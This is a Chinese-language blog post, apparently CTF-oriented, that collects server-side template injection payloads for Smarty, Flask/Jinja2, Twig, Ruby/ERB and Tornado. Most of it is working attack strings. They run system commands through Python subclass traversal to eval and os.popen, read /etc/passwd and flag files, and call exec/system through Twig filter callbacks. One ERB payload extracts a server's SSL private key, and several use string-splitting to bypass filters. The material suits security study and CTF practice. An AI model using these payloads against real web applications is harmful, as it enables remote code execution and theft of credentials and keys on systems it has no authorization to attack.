---
title: 模板注入常见payload
date: 2020-04-23 09:42:21
updated: 2020-04-23 09:42:21
categories: web
---

模板(smart、Flask、jinjia2、TWIG、Ruby/ERB、tornado)注入常见payload<!--more-->

![](https://img.npfs06.top/20210306094545.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



## smarty注入payload

{if phpinfo()}{/if}
{if system('ls')}{/if}
{ readfile('/flag') }
{if show_source('/flag')}{/if}
{if system('cat ../../../flag')}{/if} 

{system('cat /flag')}
Smarty支持使用{php}{/php}标签来执行被包裹其中的php指令

---

* ().__class__.__bases__ [0] .__subclasses__() [40] (r'/etc/passwd').read()
* ().__class__.__bases__ [0] .__subclasses__() [59] .__init__.func_globals.values() [13]\['eval']('__import__("os").popen("ls /").read()' )

---



于是把id换成`ls -a`这里一定要`-a`，本来开局我就拿到了shell，但是因为没有加`-a`，于是没有想到flag在上目级录

执行`{{ b['eval'] ('__import__("os").popen(""cat ../flag"").read()') }}`



## FLASK

```
().__class__.__bases__[0].__subclasses__() 
---查看可用模块

().__class__.base__.__subclasses__().index(warnings.catch_warnings)
可以查看当前位置，不过题目环境不能用。手动数吧= = 169位

{{().__class__.__bases__[0].__subclasses__()[169].__init__.__globals__.__builtins__['eval']("__import__('os').popen('whoami').read()")}}

 {{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls /').read()")}}
发现可以执行，构造命令

{{''.__class__.__mro__[1].__subclasses__()
[169].__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag').read()")}}
没有什么过滤= =友好!

```

```
或者找到os._wrap_close模块 117个
{{"".__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('dir').read()}}  

当前文件夹

{{"".__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('cat /flag').read()}}
来打开文件，payload有很多慢慢摸索慢慢积累= =

```

```
内含os模块的类 class'site._Printer'   （不需要import os）
       a. 目录查询
        {{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls').read()}}
        因为这里listdir同样被ban了
      b.  读取目录flasklight
        {{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls /flasklight').read()}}
       c. 读取flag
        {{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('cat coomme_geeeett_youur_flek').read()}}
```



## jinjia2

```
测试：  {{7*'7'}}  #输出7777777
{% if 1 %}1{% endif %}
```

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag').read()") }}{% endif %}{% endfor %}
```


```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('<command>').read()") }}{% endif %}{% endfor %}
```
直接注入

```
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__im'+'port__']('o'+'s').listdir('/')}}{% endif %}{% endfor %}
```

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt').read()}}{% endif %}{% endfor %}
```





## TWIG

```
测试： {{7*'7'}}  #输出49
测试：  {#comment#}{{7*7}}   #输出49
这里{#comment#}是twig独有的注释符
```

![](https://img.npfs06.top/20210306094611.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

```

{{'/etc/passwd'|file_excerpt(1,30)}}

{{app.request.files.get(1).__construct('/etc/passwd','')}}
{{app.request.files.get(1).openFile.fread(99)}}
rce

{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{{['cat /etc/passwd']|filter('system')}}

POST /subscribe?0=cat+/etc/passwd HTTP/1.1
{{app.request.query.filter(0,0,1024,{'options':'system'})}}
```





##   Ruby/ERB

<%=语法可以用来执行Ruby语句，并会尝试将结果转换为字符串，以附在最终的结果文本中。我们可以使用如下攻击载荷来尝试执行数学运算：

```
ruby <%= 7 * 7 %>
ruby <%= File.open(‘/etc/passwd’).read %>
ruby <%= self %>    //枚举该对象可用的属性及方法
ruby <%= self.class.name %>   //获取self对象的类名
ruby <%= self.methods %>
ruby <%= self.method(:handle_POST).parameters %>  //获取目标所需的具体参数
ruby <%= session.class.name %>
ruby <%= self.instance_variables %>
ruby <% ssl=@server.instance_variable_get(:@ssl_context) %><%= ssl.instance_variables %>
ruby <% ssl = @server.instance_variable_get(:@ssl_context) %><%= ssl.instance_variable_get(:@key) %>   //提取key值
```





## Tornado

参考链接：https://www.anquanke.com/post/id/244153#h2-4

```
{{xxx}}
{%xxx%}
{#xxx#}

//其中{##}是注释用的，里面的语句不会被执行，而{{}}与{%%}则可以被用来执行命令。
```

```
首先是{{}}，这个标签可以说是非常危险，因为它里面可以执行任意的python函数，比如eval函数{{eval("xxx")}}
```

<img src="http://img.npfs06.top/20210723103123.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;" />

```
除了python中的内置函数可以被调用外，还有一些tornado自带的原生类也可以被用来命令执行，可以使用{{globals()}}来查看所有可用的全局变量，如下图所示。
```

<img src="http://img.npfs06.top/20210723103149.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;" />

具体有哪些全局变量可以用，哪些变量可以被用来执行命令，各位大佬可以研究研究，我就不列举了。

`{%%}`是`tornado`的另一个标签，它里面的语句受到限制，格式为`{%操作名 参数%}`，操作名在`tornado`的源码中进行了规定，具体源码在`tornado`库中的`template.py`中，以下为从源码中总结出来的所有操作名。

```
apply、autoescape、block、comment、extends、for、from、if、import、include、module、raw、set、try、while、whitespace
```

具体操作的意义请自行阅读源码，本文不再赘述，唯独介绍一下`raw` 操作，该操作可以执行原生的python代码。

<img src="http://img.npfs06.top/20210723103221.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;" />

懂我意思吧.jpg，各种python黑魔法走起